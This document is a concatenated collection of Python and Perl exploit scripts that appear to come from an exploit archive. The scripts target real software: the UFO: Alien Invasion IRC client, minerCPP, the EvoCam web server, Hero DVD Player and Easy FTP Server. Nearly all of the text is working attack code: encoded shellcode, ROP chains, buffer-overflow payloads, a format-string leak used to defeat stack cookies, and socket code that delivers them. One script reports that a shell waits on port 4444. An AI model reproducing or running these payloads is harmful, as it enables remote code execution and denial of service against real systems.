rop += "\x6a\x1f\x13\x68" #0x68131F6A :  # ADD EBP,EBX
rop += "\xc6\xcd\x6d\x68" #0x686DCDC6 :  # LEAVE
rop += "A"*4

#backjump
rop2 = "\x5a\xc9\x70\x61" #0x6170C95A :  {POP}  # PUSH ESP # POP EBX # POP EBP
rop2 += "A"*4
rop2 += "\x45\x57\x10\x68" #0x68105745 :  {POP}  # MOV EAX,EBX # POP EBX # POP EBP
rop2 += "A"*4
rop2 += "A"*4
rop2 += "\xdd\x5b\x10\x68" #0x68105BDD : MOV EDX,EAX # MOV EAX,EDX   
rop2 += "\xb8\x51\x58\x67" #0x675851B8 : MOV EAX,200    
rop2 += "\x50\x49\x58\x67" #0x67584950 : ADD EAX,20
rop2 += "\xe2\x13\x6c\x68" #0x686C13E2 :  # POP EBX
rop2 += "\x0c\xff\xff\xff" # 12
rop2 += "\x02\x4d\x6d\x68" #0x686D4D02 :  # ADD AL,BL
rop2 += "\x9c\x8d\x59\x67" #0x67598D9C : POP ECX
rop2 += "\x05\xe0\x76\x61" #0x6176e005 : writable
rop2 += "\xee\x9b\x71\x61" #0x61719BEE : MOV EBX,EDX # SUB EBX,EAX # MOV EAX,EBX # MOV WORD PTR DS:[ECX+44],AX # ADD ESP,4 # POP EBX # POP EBP
rop2 += "A"*4
rop2 += "A"*4
rop2 += "A"*4
rop2 += "\x7a\x36\x13\x68" #0x6813367A : XCHG EAX,ESP

#set flNewProtect 0x40 (land here)
rop2 += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX 
rop2 += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX 
rop2 += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX 
rop2 += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX 
rop2 += "\x53\x23\x10\x68" #0x68102353 : XOR EAX,EAX 
rop2 += "\x50\x49\x58\x67" #0x67584950 : ADD EAX,20
rop2 += "\x50\x49\x58\x67" #0x67584950 : ADD EAX,20
rop2 += "\x26\x51\x58\x67" #0x67585126 : MOV DWORD PTR DS:[EDX],EAX # MOV EAX,2 

#ending
rop2 += "\x71\x33\x6c\x68" #0x686C3371 : MOV ECX,EAX # MOV EAX,ECX  
rop2 += "\xe3\xf9\x71\x61" #0x6171F9E3 : ADD ECX,ECX
rop2 += "\xe3\xf9\x71\x61" #0x6171F9E3 : ADD ECX,ECX
rop2 += "\xe3\xf9\x71\x61" #0x6171F9E3 : ADD ECX,ECX
rop2 += "\x73\x33\x6c\x68" #0x686C3373 : MOV EAX,ECX
rop2 += "\x52\x3d\x13\x68" #0x68133D52 : SUB EDX,EAX # MOV EAX,EDX   
rop2 += "\x7a\x36\x13\x68" #0x6813367A : XCHG EAX,ESP

end = "\x0d\x0a"

sploit = "001 :"
sploit += rop
sploit += "\x90" * (552 - len(rop))
sploit += rop2
sploit += shellcode
sploit += end
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('', 6667))
s.listen(1)
print ("[*] Listening on port 6667.")
print ("[*] Have someone connect to you.")
print ("[*] Type <control>-c to exit.")
conn, addr = s.accept()
print '[*] Received connection from: ', addr
 
conn.send(sploit)
conn.close
#!/usr/bin/env python
#minerCPP 0.4b Remote BOF+Format String Attack Exploit
#Software Link: http://sourceforge.net/projects/minercpp/
#Author: l3D
#Sites: http://xraysecurity.blogspot.com, http://nullbyte.org.il
#IRC: irc://irc.nix.co.il
#Email: pupipup33@gmail.com
#Tested on Windows 7

#In order to make this exploit work you should sniff the salt first.
#It's sent by the software to www.minecraft.net
#You can find it in the POST data (salt=12345 for instance).
#I added a part that sniffs it automatically using pcapy. 
#Furthermore, in a real attack it can be simply brute
#forced (it's only rand()). I didn't add this part in
#order to prevent abusing.

#The EAX can be influenced and the stack too.
#However, there is a stack cookie that
#prevents us to jump into our overwritten RET.
#There are no SEH nor vtable overwritings.

#So what can we do?...
#I found a format string attack vulnerability
#which lets us calculate the master cookie
#and get the ESP of the current thread.
#Unfortunately, the BOF is in another
#thread, so the ESP we've got may not match
#the ESP we need, what makes this exploit unstable.

#Code execution worked to me 10 out of 50 times.

from socket import *
from time import sleep
import pcapy, hashlib, re, struct, os, sys

print 'minerCPP 0.4b Remote BOF+Format String Attack by l3D (pupipup33@gmail.com)\n'

if len(sys.argv) < 3:
	print 'Usage: python %s <host> <port> [salt]' % sys.argv[0]
	print 'If salt is not specified, the exploit sniffs it automatically.'

if len(sys.argv) > 3:
	salt=sys.argv[3]
else:
	dev=pcapy.lookupdev()
	cap=pcapy.open_live(dev, 1024, False, 0)
	cap.setfilter("dst 69.175.14.242 and dst port 80")
	data=cap.next()[1]
	while 1:
		salt=re.findall(r'salt=(\d+)', data)
		if salt:
			salt=salt[0]
			break
		data=cap.next()[1]

host=sys.argv[1]
port=int(sys.argv[2])

exp=re.compile(r'0X([0-9A-F]+)')

def md5_calc(input):
	o=hashlib.md5(input)
	output=o.hexdigest()
	del o
	return output

def pack_login(nick, x):
	login='\x00\x07'
	if x:
		nick_hash=md5_calc(salt+nick)
		nick=nick.ljust(64)
		return login+nick+nick_hash
	else:
		return login+nick+'\x20'

def pack_msg(nick, x):
	msg='\x0d\x7e'
	if x:
		content='/pinfo %s ' % nick
		content=content.ljust(64, 'A')
	else:
		content='/pinfo '+nick
		content=content.ljust(64)
	return msg+content

def send_and_run(packet):
	sock=socket(AF_INET, SOCK_STREAM)
	sock.connect((host, port))
	sock.send(packet)
	sleep(1)
	sock.close()
	del sock

sleep(2)

##############################################################################################

print '[1] Stage 1: Cookie and KERNELBASE.dll ImageBase Getting'
nick='%s.%#X.%#X'
trys=0
packet=pack_msg(nick, True)

try:
	sock=socket(AF_INET, SOCK_STREAM)
	sock.connect((host, port))
	sock.send(pack_login(nick, True))
except:
	exit('[-] ERROR: Sockets error.')

data=sock.recv(2048)
while data:
	if data[0]=='\x00':
		print '[+] Logged in successfuly!'
		sock.send(packet)
	if data[0]=='\x0e':
		sock.close()
		exit('[-] ERROR: Wrong salt.')
	if data.startswith('\x0d\x00&e') and ' is a &7' in data:
		print '[+] Data has been recieved!'
		nums=[int(i, 16) for i in exp.findall(data[4:])]
		if nums:
			data=data[4:data.find('.0X')]
			if len(data)<8:
				if trys < 20:
					print '[!] Data is too short, trying again...'
					trys+=1
					sleep(1)
					sock.send(packet)
				else:
					print '[-] ERROR: Too much trys. DoSing...'
					sock.close()
					sleep(1)
					send_and_run(pack_login('A'*128, False))
					exit()
			else:
				esp=nums[1]-0xf0
				kernelbase, xored_esp=struct.unpack('2L', data)
				cookie=xored_esp^esp
				kernelbase-=0x1671
				print '[+] Stage 1 completed.'
				break
		else:
			sock.close()
			exit('[-] ERROR: addresses couldn\'t be found.')
	data=sock.recv(2048)

sock.close()
del sock
print
sleep(2)

##############################################################################################

print '[2] Stage 2: minerCPP.exe and kernel32.dll ImageBases Getting'
nick='%#X.%#X.%s'
packet=pack_msg(nick, False)

try:
	sock=socket(AF_INET, SOCK_STREAM)
	sock.connect((host, port))
	sock.send(pack_login(nick, True))
except:
	exit('[-] ERROR: Sockets error.')

data=sock.recv(2048)
while data:
	if data[0]=='\x00':
		print '[+] Logged in successfuly!'
		sock.send(packet)
	if data.startswith('\x0d\x00&e') and ' is a &7' in data:
		print '[+] Data has been recieved!'
		data=data[4:data.find(' is a &7')]
		data=exp.sub('', data, 2)[2:10]
		if len(data)==7:
			data+='\0'
		if len(data) < 8:
			sock.close()
			exit('[-] Data is too short, it can be because one of the adresses contains nullbyte...')
		else:
			kernel32, minerCPP=struct.unpack('2L', data)
			kernel32-=0x4ef88
			minerCPP-=0x5621
			print '[+] Stage 2 completed.'
			break
	data=sock.recv(2048)

sock.close()
del sock
print

##############################################################################################

print '[~] Analyzed data:'
print '[+] ESP: 0x%08x' % esp
print '[+] Cookie: 0x%08x' % cookie
print '[+] KERNELBASE.dll: 0x%08x' % kernelbase
print '[+] kernel32.dll: 0x%08x' % kernel32
print '[+] minerCPP.exe: 0x%08x' % minerCPP
print
sleep(2)

##############################################################################################

print '[3] Stage 3: Buffer Overflow'

esp+=0x50
winexec=struct.pack('L', kernel32+0x8e76d)
exitprocess=struct.pack('L', kernel32+0x52aef)
calc=struct.pack('L', esp+0x98)

junk='A'*(64-len(salt))
xored_esp=struct.pack('L', esp^cookie)
ret=winexec #jump to WinExec @ kernel32.dll
ret+='JUNK'
ret+='\x10\x01\x01\x10' #readable address @ zlib1.dll
ret+=exitprocess #jump to ExitProcess @ kernel32.dll
ret+=calc #the place of the string in the stack
ret+='\x01\xFF\xFF\xFF'
ret+='JUNK'
ret+='\xFF\xFF\xFF\xFF' #exit code -1
ret+='calc' #a program to execute

packet=pack_login(junk+xored_esp+ret, False)

send_and_run(packet)
print '[+] Packet has been sent. The server should be DoSed or a code should be executed.'
#!/usr/bin/python 
# EvoCam Web Server OSX 3.6.6 and 3.6.7

import socket 
import struct

SHELL = ( "\xdb\xd2\x29\xc9\xb1\x27\xbf\xb1\xd5\xb6\xd3\xd9\x74\x24" 
"\xf4\x5a\x83\xea\xfc\x31\x7a\x14\x03\x7a\xa5\x37\x43\xe2" 
"\x05\x2e\xfc\x45\xd5\x11\xad\x17\x65\xf0\x80\x18\x8a\x71" 
"\x64\x19\x94\x75\x10\xdf\xc6\x27\x70\x88\xe6\xc5\x65\x14" 
"\x6f\x2a\xef\xb4\x3c\xfb\xa2\x04\xaa\xce\xc3\x17\x4d\x83" 
"\x95\x85\x21\x49\xd7\xaa\x33\xd0\xb5\xf8\xe5\xbe\x89\xe3" 
"\xc4\xbf\x98\x4f\x5f\x78\x6d\xab\xdc\x6c\x8f\x08\xb1\x25" 
"\xc3\x3e\x6f\x07\x63\x4c\xcc\x14\x9f\xb2\xa7\xeb\x51\x75" 
"\x17\x5c\xc2\x25\x27\x67\x2f\x45\xd7\x08\x93\x6b\xa2\x21" 
"\x5c\x31\x81\xb2\x1f\x4c\x19\xc7\x08\x80\xd9\x77\x5f\xcd" 
"\xf6\x04\xf7\x79\x27\x89\x6e\x14\xbe\xae\x21\xb8\x93\x60" 
"\x72\x03\xde\x01\x43\xb4\xb0\x88\x47\x64\x60\xd8\xd7\xd5" 
"\x30\xd9\x1a\x55\x01\x26\xf4\x06\x21\x6b\x75\xac" )

WRITEABLE = 0x8fe66448                      # Writable address - dyld
STRCPY=0x8fe2db10                           # strcpy() in dyld

# ==================== Put stack pointer into EAX/EDX ==================== 
ROP =   struct.pack('>I',0x8fe2b3d4)     # POP - RET Insturction - Pop's over the writeable value below
ROP +=  struct.pack('>I',WRITEABLE)      # Required Writeable address here for exploit to work
ROP +=  struct.pack('>I',0x8fe2fb63)     # pop eax # ret - needed for command two below
ROP +=  struct.pack('>I',WRITEABLE)      # writeable address to pop into eax for instructions below
ROP +=  struct.pack('>I',0x8fe2fb58)     # push esp # and al,0x4 # mov [eax+0x28],edx # mov edx,[esp] # mov [eax],edx # pop eax # ret 

# ==================== Jump Over Parameters below ==================== 
ROP +=  struct.pack('>I',0xffff1d6b)     # add esp,byte +0x1c # pop ebp # ret

# ==================== strcpy call ==================== 
ROP +=  struct.pack('>I',STRCPY)         # use strcpy to copy shellcode from stack to heap
ROP +=  struct.pack('>I',0x8fe2dfd1)     # POP - POP - RET over strcpy params
ROP +=  struct.pack('>I',WRITEABLE)      # Dst Param for strcpy
ROP +=  'EEEE'                              # Src Param for strcpy - Placeholder
ROP +=  struct.pack('>I',WRITEABLE)      # Move execution to where we moved our shell
ROP +=  'C'*12                              # Padding 

# ==================== Craft Parameter 2  ==================== 
# Need to inc EAX or EDX to point to shell code

# Store  0x10 in ECX
ROP +=  struct.pack('>I',0x8fe2dae4)     # mov ecx,[esp+0x4] # add eax,edx # sub eax,ecx # ret  
ROP +=  struct.pack('>I',0x8fe2b3d4)     # POP - RET Insturction - Pop's over the value below
ROP +=  struct.pack('>I',0xffffffff)     # Value to store in ecx
ROP +=  struct.pack('>I',0x8fe0c0c7)     # inc ecx # xor al,0xc9
ROP +=  struct.pack('>I',0x8fe0c0c7)     # inc ecx # xor al,0xc9
ROP +=  struct.pack('>I',0x8fe24b3c)     # add ecx,ecx # ret
ROP +=  struct.pack('>I',0x8fe24b3c)     # add ecx,ecx # ret
ROP +=  struct.pack('>I',0x8fe24b3c)     # add ecx,ecx # ret
ROP +=  struct.pack('>I',0x8fe24b3c)     # add ecx,ecx # ret

# Replace stack pointer back into eax as it was trashed
ROP +=  struct.pack('>I',0x8fe2c71d)    # mov eax,edx # ret

# Add offset to paramter 
ROP +=  struct.pack('>I',0x8fe2def4)    # add eax,ecx # ret

# Swap over so we can work on fresh copy of saved ESP
ROP +=  struct.pack('>I',0x8fe0e32d)    # xchg eax,edx

# Increase ECX some more times to point to our nop sled/shell code
ROP +=  struct.pack('>I',0x8fe0c0c7)     # inc ecx # xor al,0xc9
ROP +=  struct.pack('>I',0x8fe0c0c7)     # inc ecx # xor al,0xc9
ROP +=  struct.pack('>I',0x8fe24b3c)     # add ecx,ecx # ret
ROP +=  struct.pack('>I',0x8fe24b3c)     # add ecx,ecx # ret
ROP +=  struct.pack('>I',0x8fe24b3c)     # add ecx,ecx # ret

# Add offset to shellcode 
ROP +=  struct.pack('>I',0x8fe2def4)     # add eax,ecx # ret

# Swap back
ROP +=  struct.pack('>I',0x8fe0e32d)     # xchg eax,edx

# Copy parameter to placeholder
ROP +=  struct.pack('>I',0x8fe2fb61)     # mov [eax],edx # pop eax # ret
ROP +=  'G'*4                               # junk to pop into eax

# ==================== Call strcpy function ==================== 

# Set our Stack pointer back to original value 
ROP +=  struct.pack('>I',0x8fe0e32d)     # xchg eax,edx
ROP +=  struct.pack('>I',0x8fe2daea)     # sub eax,ecx # ret

# Return execution to our strdup call above
ROP +=  struct.pack('>I',0x8fe0b1c2)     # xchg eax,ebp # inc ebp # ret 
ROP +=  struct.pack('>I',0x8fe2b6a5)     # dec ebp # ret
ROP +=  struct.pack('>I',0xffff01f3)     # mov esp,ebp # pop ebp # ret
ROP +=  'G'*4                            # junk

# ==================== Exploit code to be copied to heap ==================== 

NOP =   '\x90' * 10
BUFFER = 'A'*1564 + ROP + NOP + SHELL

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
connect=s.connect(('192.168.1.10',8080))
print '[+] Sending evil buffer...'
s.send("GET " +BUFFER + " HTTP/1.0\r\n\r\n")
print "[+] Done!"
print "[*] Check your shell on remote host port 4444"
s.close() 
# Exploit Title : Hero DVD Remote Buffer Overflow Exploit
# Date          : July 7, 2010
# Author        : chap0 [www.seek-truth.net]
# Software Link : http://download.cnet.com/Hero-DVD-Player/3000-7970_4-10127412.html
# Version       : 3.0.8
# OS            : Windows XP SP3 
# Greetz to     : God the Creator, Sud0 (Thanks Bro for the Support)
# The Crew	: http://www.corelan.be:8800/index.php/security/corelan-team-members/
# Advisory	: http://www.corelan.be:8800/advisories.php?id=CORELAN-10-056
#
# Script provided 'as is', without any warranty.
# Use for educational purposes only.
# Do not use this code to do anything illegal !
# Corelan does not want anyone to use this script
# for malicious and/or illegal purposes
# Corelan cannot be held responsible for any illegal use.
#
# Note : you are not allowed to edit/modify this code.  
# If you do, Corelan cannot be held responsible for any damages this may cause.
# Code :
print "|------------------------------------------------------------------|\n";
print "|                         __               __                      |\n";
print "|   _________  ________  / /___ _____     / /____  ____ _____ ___  |\n";
print "|  / ___/ __ \\/ ___/ _ \\/ / __ `/ __ \\   / __/ _ \\/ __ `/ __ `__ \\ |\n";
print "| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |\n";
print "| \\___/\\____/_/   \\___/_/\\__,_/_/ /_/   \\__/\\___/\\__,_/_/ /_/ /_/  |\n";
print "|                                                                  |\n";
print "|                                       http://www.corelan.be:8800 |\n";
print "|                                                                  |\n";
print "|-------------------------------------------------[ EIP Hunters ]--|\n\n";
print "[*] Hero DVD Player Remote Exploit by chap0.\n"; 
print "[*] Visit Corelan.be port 8800, Preparing Payload . . .\n";
sleep(3);

my $file = "httpd.conf";

$code = "Redirect permanent /sploit http://";
$junk = "A" x 128;
$more = "yH2X" ; # alpha value for "yH2X" = 0x58324879 from msg723.acm
$nops = "\x42" x 24; #Padding
#message box code
$shell

open(FILE,">$file");
print FILE $code.$junk.$more.$nops.$shell;
close(FILE);

print "[*] Use Backtrack! place httpd.conf in /etc/apache2/ and start apache.\n";
print "[*] Have Someone Connect to your Server /sploit.\n";  #!/usr/bin/python

# UFO: Alien Invasion v2.2.1 IRC Client Remote Code Execution - MacOSX
# OS X Snow Leopard: d1dn0t
# OS X Leopard: dookie
# Windows PoC: Jason Geffner http://www.exploit-db.com/exploits/14013

import sys, socket, struct

WRITEABLE = 0x8fe66448
STRCPY=0x8fe2db10

shellcode = ("\xdb\xc3\xd9\x74\x24\xf4\xbb\xf3\xbd\x8d\x7c\x33\xc9\x5d\xb1"
"\x27\x31\x5d\x18\x03\x5d\x18\x83\xc5\xf7\x5f\x78\x4d\x37\x06"
"\xd3\xee\xe7\x79\x84\xbc\xb7\x1b\xe9\xc1\xb8\x59\x8f\xc1\xc6"
"\x5d\xf9\x04\x94\x0f\xab\xe0\x18\xb2\x5a\xad\x91\x51\x36\x5d"
"\xf2\xc3\x95\xed\x9c\x26\x99\x7c\x3b\xeb\xcc\xd2\x73\x61\x3c"
"\x52\x01\x28\xec\x01\xb3\x86\xa0\xb8\xf6\xa7\xb3\x90\x81\x6f"
"\x02\xc2\x12\x84\x64\xb7\x47\x0c\x34\x87\x3d\x7f\x3a\x95\x82"
"\xfc\xc0\x59\x71\xf2\x06\x9e\x29\xa4\x38\x4e\x79\x7f\x74\xee"
"\xe9\x10\xba\xc2\x7c\x18\x73\x5e\xb3\x9a\xf0\xa5\x4b\xef\xe1"
"\x68\x8b\x5f\x66\xa4\x24\x13\x1e\xd2\x15\xb1\xb7\x4c\xe0\xd6"
"\x18\xc1\xa1\x48\x29\xda\x88\xe9\x78\xdd\x42\x63\x99\x8d\x32"
"\x20\x0e\x7e\x02\xc1\x63\xfe\x53\x0e\x2b\xaf\xd3\x43\x4c\x45")

# ==================== Put stack pointer into EAX/EDX ==================== 
ROP = 	struct.pack('<I',0x8fe2b3d4)        # POP - RET Insturction - Pop's over the writeable value below
ROP += 	struct.pack('<I',WRITEABLE)					# Required Writeable address here for exploit to work
ROP += 	struct.pack('<I',0x8fe2fb63)				# pop eax # ret
ROP += 	struct.pack('<I',WRITEABLE)					# Pop writeable address into eax for instructions below
ROP += 	struct.pack('<I',0x8fe2fb58)				# push esp # and al,0x4 # mov [eax+0x28],edx # mov edx,[esp] # mov [eax],edx # pop eax # ret 

# ==================== Jump Over Parameters below ==================== 
ROP += 	struct.pack('<I',0xffff1d6b)				# add esp,byte +0x1c # pop ebp # ret

# ==================== strcpy call ==================== 
ROP += 	struct.pack('<I',STRCPY)						# use strcpy to copy shellcode from stack to heap
ROP += 	struct.pack('<I',0x8fe2dfd1)				# POP - POP - RET over strcpy params
ROP += 	struct.pack('<I',WRITEABLE)					# Dst Param for strcpy
ROP += 	'EEEE'															# Src Param for strcpy
ROP += 	struct.pack('<I',WRITEABLE)					# Move execution to where we moved our shell
ROP += 	'C'*12															# Padding 

# ==================== Craft Parameter 2  ==================== 

# Need to inc EAX or EDX to point to shell code

# Store  0x40 in ECX
ROP += 	struct.pack('<I',0x8fe2dae4)					# mov ecx,[esp+0x4] # add eax,edx # sub eax,ecx # ret  
ROP += 	struct.pack('<I',0x8fe2b3d4) 	       		    # POP - RET Insturction - Pop's over the value below
ROP += 	struct.pack('<I',0xffffffff)					# Value to store in ecx
ROP += 	struct.pack('<I',0x8fe0c0c7)					# inc ecx # xor al,0xc9
ROP += 	struct.pack('<I',0x8fe0c0c7)					# inc ecx # xor al,0xc9
ROP += 	struct.pack('<I',0x8fe24b3c)			 		# add ecx,ecx # ret
ROP += 	struct.pack('<I',0x8fe24b3c)					# add ecx,ecx # ret
ROP += 	struct.pack('<I',0x8fe24b3c)					# add ecx,ecx # ret
ROP += 	struct.pack('<I',0x8fe24b3c)					# add ecx,ecx # ret

# Replace stack pointer back into eax as it was trashed
ROP += 	struct.pack('<I',0x8fe2c71d)					# mov eax,edx # ret

# Add offset to paramter 
ROP += 	struct.pack('<I',0x8fe2def4)					# add eax,ecx # ret

# Swap over so we can work on fresh copy of saved ESP
ROP += 	struct.pack('<I',0x8fe0e32d)					# xchg eax,edx

# Double ECX a few more times to point to our nop sled/shell code
ROP += 	struct.pack('<I',0x8fe0c0c7)					# inc ecx # xor al,0xc9
ROP += 	struct.pack('<I',0x8fe0c0c7)					# inc ecx # xor al,0xc9
ROP += 	struct.pack('<I',0x8fe24b3c)					# add ecx,ecx # ret
ROP += 	struct.pack('<I',0x8fe24b3c)					# add ecx,ecx # ret
ROP += 	struct.pack('<I',0x8fe24b3c)					# add ecx,ecx # ret

# Add offset to shellcode 
ROP += 	struct.pack('<I',0x8fe2def4)					# add eax,ecx # ret

# Swap back
ROP += 	struct.pack('<I',0x8fe0e32d)					# xchg eax,edx

# Copy parameter to placeholder
ROP += 	struct.pack('<I',0x8fe2fb61)					# mov [eax],edx # pop eax # ret
ROP += 	'G'*4																	# junk

# ==================== Call strcpy function ==================== 

# Set our Stack pointer back to original value 
ROP += 	struct.pack('<I',0x8fe0e32d)					# xchg eax,edx
ROP += 	struct.pack('<I',0x8fe2daea)					# sub eax,ecx # ret

# Return execution to our strdup call above
ROP += 	struct.pack('<I',0x8fe0b1c2)					# xchg eax,ebp # inc ebp # ret 
ROP += 	struct.pack('<I',0x8fe2b6a5)					# dec ebp # ret
ROP += 	struct.pack('<I',0xffff01f3)					# mov esp,ebp # pop ebp # ret
ROP += 	'G'*4																	# junk

# ==================== Call Exploit code from heap ==================== 


sploit = "001 :"
sploit += "\x41" * 528
sploit += ROP
sploit += '\x90' * 10
sploit += shellcode
sploit += "\x0d\x0a"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('', 6667))
s.listen(1)
print ("[*] Listening on port 6667.")
print ("[*] Have someone connect to you.")
print ("[*] Type [control]-c to exit.")
conn, addr = s.accept()
print '[*] Received connection from: ', addr

conn.send(sploit)
conn.close
#!/usr/bin/python
import socket,sys

# Tested on XP Pro SP2 [ Eng ] and XP Pro SP3 [ Eng ]

print """
#
****************************************************************************
#									   #
*  Easy FTP Server v1.7.0.11 [MKD] Remote BoF Exploit Post Authentication  *
*  Author / Discovered by : Karn Ganeshen 				   *
*  Date : July 5, 2010							   *
*  KarnGaneshen [aT] gmail [d0t] com     				   *
*  http://ipositivesecurity.blogspot.com				   *
#									   #
****************************************************************************
#
"""

if len(sys.argv) != 3:
    print "Usage: ./easyftp_mkd.py <Target IP> <Port>"
    sys.exit(1)
 
target = sys.argv[1]
port = int(sys.argv[2])

# Buffer needed -> 272 bytes
# Metasploit Shellcode PoC - Calc.exe [ 228 bytes ] [ shikata_ga_nai - 1 iteration ] [ badchars \x00\x0a\x2f\x5c ]

shellcode = ("\xda\xc0\xd9\x74\x24\xf4\xbb\xe6\x9a\xc9\x6d\x5a\x33\xc9\xb1"
"\x33\x31\x5a\x18\x83\xea\xfc\x03\x5a\xf2\x78\x3c\x91\x12\xf5"
"\xbf\x6a\xe2\x66\x49\x8f\xd3\xb4\x2d\xdb\x41\x09\x25\x89\x69"
"\xe2\x6b\x3a\xfa\x86\xa3\x4d\x4b\x2c\x92\x60\x4c\x80\x1a\x2e"
"\x8e\x82\xe6\x2d\xc2\x64\xd6\xfd\x17\x64\x1f\xe3\xd7\x34\xc8"
"\x6f\x45\xa9\x7d\x2d\x55\xc8\x51\x39\xe5\xb2\xd4\xfe\x91\x08"
"\xd6\x2e\x09\x06\x90\xd6\x22\x40\x01\xe6\xe7\x92\x7d\xa1\x8c"
"\x61\xf5\x30\x44\xb8\xf6\x02\xa8\x17\xc9\xaa\x25\x69\x0d\x0c"
"\xd5\x1c\x65\x6e\x68\x27\xbe\x0c\xb6\xa2\x23\xb6\x3d\x14\x80"
"\x46\x92\xc3\x43\x44\x5f\x87\x0c\x49\x5e\x44\x27\x75\xeb\x6b"
"\xe8\xff\xaf\x4f\x2c\x5b\x74\xf1\x75\x01\xdb\x0e\x65\xed\x84"
"\xaa\xed\x1c\xd1\xcd\xaf\x4a\x24\x5f\xca\x32\x26\x5f\xd5\x14"
"\x4e\x6e\x5e\xfb\x09\x6f\xb5\xbf\xe5\x25\x94\x96\x6d\xe0\x4c"
"\xab\xf0\x13\xbb\xe8\x0c\x90\x4e\x91\xeb\x88\x3a\x94\xb0\x0e"
"\xd6\xe4\xa9\xfa\xd8\x5b\xca\x2e\xbb\x3a\x58\xb2\x12\xd8\xd8"
"\x51\x6b\x28")

nopsled = "\x90" * 40
ret = "\x10\x3B\x88\00" # MAGIC RET 00883B10 (SP2) / 00893B58 (SP3) [ EBP points to nopsled when overflowed ]
payload = nopsled + shellcode + ret 

print "[+] Launching exploit against " + target + "..."
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    connect=s.connect((target, port))
    print "[+] Connected!"
except:
    print "[!] Connection failed!"
    sys.exit(0)
    
s.recv(1024)

# Targetting default user 'anonymous' on the target
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)

print "[+] Sending payload..."
s.send('MKD ' + payload + '\r\n')

print "[!] Verifying if the user has 'Create Directory' permission. This may take some time..."

try:
    s.recv(1024)    
    print "[!] Uhh.. User does not have MKD privilege. +++Exploit failed+++"

except:
    print "[+] +++Exploit Successful+++ ^_^"

s.close()#!/usr/bin/python
import socket,sys

# Tested on XP Pro SP2 [ Eng ] and XP Pro SP3 [ Eng ]

print """
#
****************************************************************************
#									   #
*  Easy FTP Server v1.7.0.11 [LIST] Remote BoF Exploit Post Authentication *
*  Author / Discovered by : Karn Ganeshen 				   *
*  Date : July 5, 2010							   *
*  KarnGaneshen [aT] gmail [d0t] com     				   *
*  http://ipositivesecurity.blogspot.com				   *
#									   #
****************************************************************************
#
"""

if len(sys.argv) != 3:
    print "Usage: ./easyftp_LIST.py <Target IP> <Port>"
    sys.exit(1)
 
target = sys.argv[1]
port = int(sys.argv[2])

# Buffer needed -> 272 bytes
# Metasploit Shellcode PoC - Calc.exe [ 228 bytes ] [ shikata_ga_nai - 1 iteration ] [ badchars \x00\x0a\x2f\x5c ]

shellcode = ("\xda\xc0\xd9\x74\x24\xf4\xbb\xe6\x9a\xc9\x6d\x5a\x33\xc9\xb1"
"\x33\x31\x5a\x18\x83\xea\xfc\x03\x5a\xf2\x78\x3c\x91\x12\xf5"
"\xbf\x6a\xe2\x66\x49\x8f\xd3\xb4\x2d\xdb\x41\x09\x25\x89\x69"
"\xe2\x6b\x3a\xfa\x86\xa3\x4d\x4b\x2c\x92\x60\x4c\x80\x1a\x2e"
"\x8e\x82\xe6\x2d\xc2\x64\xd6\xfd\x17\x64\x1f\xe3\xd7\x34\xc8"
"\x6f\x45\xa9\x7d\x2d\x55\xc8\x51\x39\xe5\xb2\xd4\xfe\x91\x08"
"\xd6\x2e\x09\x06\x90\xd6\x22\x40\x01\xe6\xe7\x92\x7d\xa1\x8c"
"\x61\xf5\x30\x44\xb8\xf6\x02\xa8\x17\xc9\xaa\x25\x69\x0d\x0c"
"\xd5\x1c\x65\x6e\x68\x27\xbe\x0c\xb6\xa2\x23\xb6\x3d\x14\x80"
"\x46\x92\xc3\x43\x44\x5f\x87\x0c\x49\x5e\x44\x27\x75\xeb\x6b"
"\xe8\xff\xaf\x4f\x2c\x5b\x74\xf1\x75\x01\xdb\x0e\x65\xed\x84"
"\xaa\xed\x1c\xd1\xcd\xaf\x4a\x24\x5f\xca\x32\x26\x5f\xd5\x14"
"\x4e\x6e\x5e\xfb\x09\x6f\xb5\xbf\xe5\x25\x94\x96\x6d\xe0\x4c"
"\xab\xf0\x13\xbb\xe8\x0c\x90\x4e\x91\xeb\x88\x3a\x94\xb0\x0e"
"\xd6\xe4\xa9\xfa\xd8\x5b\xca\x2e\xbb\x3a\x58\xb2\x12\xd8\xd8"
"\x51\x6b\x28")

nopsled = "\x90" * 40
ret = "\x10\x3B\x88\00" # MAGIC RET 00883B10 [ CALL EDI ]
payload = nopsled + shellcode + ret 

print "[+] Launching exploit against " + target + "..."
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    connect=s.connect((target, port))
    print "[+] Connected!"
except:
    print "[!] Connection failed!"
    sys.exit(0)

s.recv(1024)

# Targetting default user 'anonymous' on the target
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
print "[+] Sending payload..."
s.send('LIST ' + payload + '\r\n')
s.recv(1024)

print "[!] Verifying if LIST is enabled for the user. This may take some time..."

try:
    s.recv(1024)
    print "[!] Uhh.. User does not have LIST permissions. +++Exploit failed+++"

except:
    print "[+] +++Exploit Successful+++ ^_^"

s.close()
# Exploit Title: Easy FTP Server v1.7.0.11 CWD Command Remote Buffer Overflow Exploit (Post Auth) 
# Date: 2010-07-18 
# Author: @fdiskyou
# e-mail: rui at deniable.org
# Software Link: 
# Version: 1.7.0.11
# Tested on: Windows XP SP3 en

import socket
import sys

buffersize = 268

# windows/exec - 227 bytes x86/shikata_ga_nai EXITFUNC=process, CMD=calc.exe
shellcode = ("\xb8\xf1\x18\xc7\x71\xd9\xc7\x29\xc9\xb1\x33\xd9\x74\x24\xf4"
"\x5b\x31\x43\x12\x83\xeb\xfc\x03\xb2\x16\x25\x84\xc8\xcf\x20"
"\x67\x30\x10\x53\xe1\xd5\x21\x41\x95\x9e\x10\x55\xdd\xf2\x98"
"\x1e\xb3\xe6\x2b\x52\x1c\x09\x9b\xd9\x7a\x24\x1c\xec\x42\xea"
